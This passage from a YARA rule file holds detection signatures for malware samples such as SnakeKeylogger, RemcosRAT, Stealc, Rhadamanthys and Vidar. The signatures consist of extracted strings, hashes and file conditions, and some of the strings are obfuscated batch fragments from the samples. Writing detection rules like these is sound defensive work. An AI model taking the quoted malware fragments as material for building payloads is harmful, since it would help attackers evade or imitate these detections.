      $s3 = "UbBi.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s5 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s6 = "DxYK.jVR" fullword ascii /* score: '10.00'*/
      $s7 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s8 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s9 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s10 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
      $s11 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s12 = "csvContent" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__14d544af {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_14d544af.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "14d544afc723fdbda5021743448b807968e5ba3a68310885e7aeb9f2b8cb8fa1"
   strings:
      $s1 = "gDek.exe" fullword wide /* score: '22.00'*/
      $s2 = "CommonDialog.Form1.resources" fullword ascii /* score: '15.00'*/
      $s3 = "BatchProcessing" fullword ascii /* score: '15.00'*/
      $s4 = "tNjdKb0ZG" fullword ascii /* base64 encoded string '67JoFF' */ /* score: '14.00'*/
      $s5 = "gDek.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "\\test.jpg" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__81467731 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_81467731.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "81467731cad7caa88c63f9cc0949efd53c6e0853eda90cab81993a2e567de8cd"
   strings:
      $s1 = "FaVE.exe" fullword wide /* score: '22.00'*/
      $s2 = "CommonDialog.Form1.resources" fullword ascii /* score: '15.00'*/
      $s3 = "BatchProcessing" fullword ascii /* score: '15.00'*/
      $s4 = "FaVE.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "!{79|\";+" fullword ascii /* score: '9.00'*/ /* hex encoded string 'y' */
      $s6 = "\\test.jpg" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ed68e937 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ed68e937.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ed68e937c49334eb99ff5ca7bb6b7c45645c3335c11f344f460378a5991323a5"
   strings:
      $s1 = "lZGG.exe" fullword wide /* score: '22.00'*/
      $s2 = "lZGG.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Version control systems like Git allow developers to track changes, collaborate effectively, and maintain a complete history of " wide /* score: '13.00'*/
      $s4 = "The best way to learn programming is by practicing regularly, reading other people's code, and constantly challenging yourself w" wide /* score: '12.00'*/
      $s5 = "GetWordCount" fullword ascii /* score: '9.00'*/
      $s6 = "get_TimeElapsed" fullword ascii /* score: '9.00'*/
      $s7 = "get_Accuracy" fullword ascii /* score: '9.00'*/
      $s8 = "get_TestDate" fullword ascii /* score: '9.00'*/
      $s9 = "GetRandomSampleText" fullword ascii /* score: '9.00'*/
      $s10 = "GetCharacterCount" fullword ascii /* score: '9.00'*/
      $s11 = "Test Complete!" fullword wide /* score: '9.00'*/
      $s12 = "Programming is not just about writing code; it's about solving problems, creating solutions, and bringing ideas to life through " wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e83387ea {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e83387ea.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e83387eaf804e1f901c10a215a2323211f36a4697eed30486e7018f62bf710c3"
   strings:
      $s1 = "PKYY.exe" fullword wide /* score: '22.00'*/
      $s2 = "PKYY.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Version control systems like Git allow developers to track changes, collaborate effectively, and maintain a complete history of " wide /* score: '13.00'*/
      $s4 = "The best way to learn programming is by practicing regularly, reading other people's code, and constantly challenging yourself w" wide /* score: '12.00'*/
      $s5 = "GetWordCount" fullword ascii /* score: '9.00'*/
      $s6 = "get_TimeElapsed" fullword ascii /* score: '9.00'*/
      $s7 = "get_Accuracy" fullword ascii /* score: '9.00'*/
      $s8 = "get_TestDate" fullword ascii /* score: '9.00'*/
      $s9 = "GetRandomSampleText" fullword ascii /* score: '9.00'*/
      $s10 = "GetCharacterCount" fullword ascii /* score: '9.00'*/
      $s11 = "Test Complete!" fullword wide /* score: '9.00'*/
      $s12 = "Programming is not just about writing code; it's about solving problems, creating solutions, and bringing ideas to life through " wide /* score: '9.00'*/
      $s13 = "* &|2{" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4620e415 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4620e415.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4620e415f8bcd713bdfbcba4e710e79c2e057d2e15dbbe2c3a39e8a229563038"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "lbT.exe" fullword wide /* score: '19.00'*/
      $s4 = "i chia cho 0!!!" fullword wide /* score: '13.00'*/
      $s5 = "lbT.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "tget xx" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5f921151 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5f921151.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5f9211510339c99b3b0dcf99aa5ed3ab7958bfb37117551c9eae256dec0cf181"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "DKo.exe" fullword wide /* score: '19.00'*/
      $s4 = "i chia cho 0!!!" fullword wide /* score: '13.00'*/
      $s5 = "DKo.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "cRVn!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2c7e7bf4 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2c7e7bf4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2c7e7bf4cd14456572dd850552354b46e89d511300f5dce48561a4f347f8d4b2"
   strings:
      $s1 = "ByWS.exe" fullword wide /* score: '22.00'*/
      $s2 = "ByWS.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "GenerateExportContent" fullword ascii /* score: '12.00'*/
      $s4 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s5 = "Analogous" fullword wide /* score: '11.00'*/
      $s6 = "\\6=)D\\(" fullword ascii /* score: '10.00'*/ /* hex encoded string 'm' */
      $s7 = "ColorSchemeGenerator.ExportForm.resources" fullword ascii /* score: '10.00'*/
      $s8 = "Error exporting file: " fullword wide /* score: '10.00'*/
      $s9 = "get_SchemeType" fullword ascii /* score: '9.00'*/
      $s10 = "GetFileFilter" fullword ascii /* score: '9.00'*/
      $s11 = "GenerateAnalogous" fullword ascii /* score: '9.00'*/
      $s12 = "GetColorHex" fullword ascii /* score: '9.00'*/
      $s13 = "{0} ({1}) - {2} colors" fullword wide /* score: '9.00'*/
      $s14 = "Export Color Scheme" fullword wide /* score: '9.00'*/
      $s15 = "Complementary" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__4741534f {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_4741534f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4741534f1ec65dc421fc7675f979c53e6408ac9722eb3b9d3db164d277d09144"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "/dumps9taw" fullword ascii /* score: '14.00'*/
      $s3 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s4 = ".QfIwd:\\(v" fullword ascii /* score: '10.00'*/
      $s5 = "+G%g:\\" fullword ascii /* score: '9.50'*/
      $s6 = "* ;S.k" fullword ascii /* score: '9.00'*/
      $s7 = "5%I%n." fullword ascii /* score: '8.00'*/
      $s8 = "ftwareuq" fullword ascii /* score: '8.00'*/
      $s9 = " udmu4%N%4w" fullword ascii /* score: '8.00'*/
      $s10 = "tUeQZ /Vp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Rhadamanthys_signature__8cd0ffc23a93d40428f4277ead307c71_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_8cd0ffc23a93d40428f4277ead307c71(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e7ade43f465f3236184a569f536b9cedfd4d692a7d8512bba1f65e4bfe71aea1"
   strings:
      $s1 = " KERNEL32.DLL" fullword wide /* score: '20.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s3 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s4 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s5 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s6 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      all of them
}

rule Stealc_signature__8cd0ffc23a93d40428f4277ead307c71_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_8cd0ffc23a93d40428f4277ead307c71(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bc63e5b5d616f5c554bb2d2e4121590cf7a1dddfd3b362e2a5a4ebb74c086e56"
   strings:
      $s1 = " KERNEL32.DLL" fullword wide /* score: '20.00'*/
      $s2 = "<iAEiQ10!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule Stealc_signature__8cd0ffc23a93d40428f4277ead307c71_imphash__1bd80ac9 {
   meta:
      description = "_subset_batch - file Stealc(signature)_8cd0ffc23a93d40428f4277ead307c71(imphash)_1bd80ac9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1bd80ac9b25684d8a761d999933f416fb8afa628980eb1d06413685799944e10"
   strings:
      $s1 = " KERNEL32.DLL" fullword wide /* score: '20.00'*/
      $s2 = "<iAEiQ10!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule ResolverRAT_signature_ {
   meta:
      description = "_subset_batch - file ResolverRAT(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87773b42629277b367e948606aba6c7de6cb8418e1f4e8922617567e8b7cdea2"
   strings:
      $s1 = "PO#4503249566.com" fullword ascii /* score: '15.00'*/
      $s2 = "+aTsiZDEt" fullword ascii /* base64 encoded string 'i;"d1-' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__3 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b18aa5a1a02bcd28e242c1d23585d565f88063e6c1b251873e5872c95652679a"
   strings:
      $x1 = "lejXwkiAhWYoWbfXDzNkHYBVjuHKdXQLuZQ2YswOaAFKkShEibu/saHKqhQHzIOsrbBBuOvgJB6YnErltnk1EjlAUct2gEicNiAbwSLzOjWfSUiU4cKRENQsa+GGF0LX" ascii /* score: '60.00'*/
      $s2 = "%nYASxrgMzToogCIkfyUPdaRhbBzFHgXsSFFATvGzrcPzYQarOacIyvhNHSqwsaFSvwWaxHQjsUYAKSJ% \"%meauIexFAzoJDyPZhLCwxLYEhDes%w%psgyzyEgsbeU" ascii /* score: '24.00'*/
      $s3 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%OerChnShzRCxkBSasswS%K%cUgnRKgcp" ascii /* score: '24.00'*/
      $s4 = "%nYASxrgMzToogCIkfyUPdaRhbBzFHgXsSFFATvGzrcPzYQarOacIyvhNHSqwsaFSvwWaxHQjsUYAKSJ% \"%zkUcOFVSNyvYqaeGOeKIounbeNTt%m%szawRPaKyrIo" ascii /* score: '23.00'*/
      $s5 = "%yLNJJpEJCRbRfFIIouFNYYMrbcqBrGJGjWloqVYyKWHrBPyGKvOrqQPayWhgzDSvIUhIUUSSVHCCQVpMdjqvsSQSGL% \"%NOCOvEoHcSrcOYMzDFvy%Q%BIhcXDOJR" ascii /* score: '22.00'*/
      $s6 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%uYFfZygwarWNuclhwIlTPIYtTr%d%fdh" ascii /* score: '22.00'*/
      $s7 = "%JzQzqoErZoYgyhWZtwouuPhRPDqZbNuUABFg%@%AMQIXEuobefsIYeZpduSyjnyfQMuEfxcpnskYlWKmcn%%KhTpPuLYKOmQYRdHszkwhDCUfuBDGkfVwPnx%i%XeJU" ascii /* score: '22.00'*/
      $s8 = "%FcZOqDqkKOYuQgxHlyRAtHowLGYaQwKBFbHqSEyUZwjRsQqFXzcKhgQyodCkfQTOEXooZGogAwawXWDuPTCRTzUYKIBpBNpIcVMVcBfQKvKkGTaSZIULOCuECPeRFyf" ascii /* score: '22.00'*/
      $s9 = "%nYASxrgMzToogCIkfyUPdaRhbBzFHgXsSFFATvGzrcPzYQarOacIyvhNHSqwsaFSvwWaxHQjsUYAKSJ% \"%VwlIYZjOxDiBvrjhzQlmdQ%A%epJjTDUnpcrfAWoWsV" ascii /* score: '22.00'*/
      $s10 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%jnCzvXdwwCxUJiNpDavFleC%D%qdnjTJ" ascii /* score: '21.00'*/
      $s11 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%YqMmAiudhZgvZskBnTKBByaunz%T%LEJ" ascii /* score: '21.00'*/
      $s12 = "xQQEYEFZvhFhm8MGt9bIqNVnP17KvEWdPtJYYchTLYHkP9KgPEPYJnTDgHGeTRu3gLZLb7jKSLwJJVrq91SKL89sb+S+WY+GZ/AXr03Ya0za+bD6hBReE2C6i8SWzZXJ" ascii /* score: '21.00'*/
      $s13 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%QEroUIJtYBkUOudUwxGHPvLPJEW%D%vL" ascii /* score: '20.00'*/
      $s14 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%awcVPvDpoHWNqIDbZluD%u%TdIwlJxSH" ascii /* score: '20.00'*/
      $s15 = "%yLNJJpEJCRbRfFIIouFNYYMrbcqBrGJGjWloqVYyKWHrBPyGKvOrqQPayWhgzDSvIUhIUUSSVHCCQVpMdjqvsSQSGL% \"%hehKVdpTSetnbzlQyiKfTPfiaXlS%l%c" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__4 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "44f1db6fccd9f649fc3b5d5c698463c4e1691e3705c5c5962ae1b488475a624b"
   strings:
      $x1 = "TableTypeComponent_File14.36.32532.0D23gKyQqClaig.puvLanguageFileNameVersion1033tw8qvhJk021Klaen.shjMSVCP140.dllSequenceAttribut" ascii /* score: '57.00'*/
      $x2 = ";54Feature attributesPrimary key, name of action, normally appears in sequence table unless private use.The numeric custom actio" ascii /* score: '43.00'*/
      $s3 = "ishFeaturesPublishProductInstallUISequenceValidateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRe" ascii /* score: '29.00'*/
      $s4 = "reFeature_ParentTitleDescriptionDisplayLevelSiliconeFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponents" ascii /* score: '23.00'*/
      $s5 = "astProductVersion7.6.8.0UpgradeCode{96E20E4A-7CC7-406F-8CB3-F69CF3ACDFC3}AdminUISequenceCostInitializeFileCostCostFinalizeExecut" ascii /* score: '21.00'*/
      $s6 = "4853}{E1B94F1F-863F-5103-A080-297CE2959FA5}DirectoryDirectory_ParentDefaultDirLocalAppDataFolderDidrachmTARGETDIR.SourceDirFeatu" ascii /* score: '20.00'*/
      $s7 = "TableTypeComponent_File14.36.32532.0D23gKyQqClaig.puvLanguageFileNameVersion1033tw8qvhJk021Klaen.shjMSVCP140.dllSequenceAttribut" ascii /* score: '19.00'*/
      $s8 = "esFileSizePtxuLQBmcFopackager.dllcabeoIYKNujtiVfsuat11wgttn.exe|Switch_Overlay.exeNG7lAzw7aCEyDNV7f1wovihklqt.dll|VCRUNTIME140.d" ascii /* score: '18.00'*/
      $s9 = "eActionAdminExecuteSequenceInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePubl" ascii /* score: '18.00'*/
      $s10 = "key connectsText;Formatted;Template;Condition;Guid;Path;Version;Language;Identifier;Binary;UpperCase;LowerCase;Filename;Paths;An" ascii /* score: '16.00'*/
      $s11 = "s a root of the install tree.The default sub-path under parent's path.Primary key used to identify a particular feature record.O" ascii /* score: '16.00'*/
      $s12 = ", set either by the AppSearch action or with the default setting obtained from the Directory table.Remote execution option, one " ascii /* score: '15.00'*/
      $s13 = "ll terminate, returning iesBadActionData.Number that determines the sort order in which the actions are to be executed.  Leave b" ascii /* score: '14.00'*/
      $s14 = ";54Feature attributesPrimary key, name of action, normally appears in sequence table unless private use.The numeric custom actio" ascii /* score: '13.00'*/
      $s15 = "e by launcher or loader.String value for property.  Never null or empty.Name of action to invoke, either in the engine or the ha" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__026ce5e7482c82368e554338ef80854e_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_026ce5e7482c82368e554338ef80854e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1fd98c84f1c3de27f5cbf7e791ea727737f98c6f9a691efb60e2f947fb7c4dbd"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s5 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Rhadamanthys_signature__1ce39e07a979f0e3da342ee46f74268b_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1ce39e07a979f0e3da342ee46f74268b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "69391d8f605bce4ca985eb31a516c366cab535348a5c90c27f8af466a078efbb"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s5 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Rhadamanthys_signature__37801b95c438a73e300d9190a7cb0752_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_37801b95c438a73e300d9190a7cb0752(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "329fc71ce853cd0f6c4a4f346681639de2173f6dfd888fcd4497cc7d73ac2f33"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s5 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s6 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s7 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash__8fdb2fd6 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash)_8fdb2fd6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8fdb2fd689e93b893774d1cb93c88682c69b5d4dd255ed877354086acfdf7e88"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s5 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s6 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s7 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s8 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Vidar_signature__37801b95c438a73e300d9190a7cb0752_imphash_ {
   meta:
      description = "_subset_batch - file Vidar(signature)_37801b95c438a73e300d9190a7cb0752(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f0311927554d2cc8d96fdcc7756851ce6020e33ac2663a736dca2ad4fd411d48"
   strings:
      $s1 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
      $s2 = "CIJC!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "412ca2418f93632714eda5e2bff8ac5dce16635803b805052d0353a0a9c3e28a"
   strings:
      $s1 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s2 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s3 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Stealc_signature__83ff2a6950f98d2f65fd6b1c5c33e68a_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_83ff2a6950f98d2f65fd6b1c5c33e68a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "20af689a1596040d8150691b55df006755e0f6cdfe4fe8ef852d6c526ff888c2"
   strings:
      $s1 = " KERNEL32.DLL" fullword wide /* score: '20.00'*/
      $s2 = "<iAEiQ10!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule RustyStealer_signature__771e7060f77651b6120669975f9dfcdb_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_771e7060f77651b6120669975f9dfcdb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "974752017f371e0c6b74ffa781f4ae43929d9504512c4d69340ecb612964e46e"
   strings:
      $s1 = "r7Wz@v#LmN!%Hd?X$4qJs8&TuB^fE1pGFailed to execute shellcode" fullword ascii /* score: '24.00'*/
      $s2 = "fatal runtime error: drop of the panic payload panicked, aborting" fullword ascii /* score: '21.00'*/
      $s3 = "C:\\Users\\xuy\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\cipher-0.4.4\\src\\stream.rs" fullword ascii /* score: '20.00'*/
      $s4 = "C:\\Users\\xuy\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\aes-0.8.4\\src\\soft\\fixslice64.rs" fullword ascii /* score: '20.00'*/
      $s5 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s6 = "dropper.pdb" fullword ascii /* score: '16.00'*/
      $s7 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
      $s8 = "Once instance has previously been poisoned" fullword ascii /* score: '14.00'*/
      $s9 = "library\\std\\src\\sync\\poison\\once.rs" fullword ascii /* score: '14.00'*/
      $s10 = "Local\\RustBacktraceMutex00000000" fullword ascii /* score: '11.00'*/
      $s11 = "SetThreadDescription" fullword ascii /* score: '10.00'*/
      $s12 = "failed to generate unique thread ID: bitspace exhausted" fullword ascii /* score: '10.00'*/
      $s13 = "fatal runtime error: initialization or cleanup bug, aborting" fullword ascii /* score: '10.00'*/
      $s14 = "fatal runtime error: Rust panics must be rethrown, aborting" fullword ascii /* score: '10.00'*/
      $s15 = "CreateThread failedVirtualAlloc failed1234567890123456" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule Stealc_signature__37801b95c438a73e300d9190a7cb0752_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_37801b95c438a73e300d9190a7cb0752(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "984fafd740b3efe1f2606d3aa036440229ee8fa6b7608587820cb1c0064b618f"
   strings:
      $s1 = "UVWSPH" fullword ascii /* reversed goodware string 'HPSWVU' */ /* score: '13.50'*/
      $s2 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Vidar_signature__37801b95c438a73e300d9190a7cb0752_imphash__1f2af392 {
   meta:
      description = "_subset_batch - file Vidar(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_1f2af392.exe"
      author = "Metin Yigit"
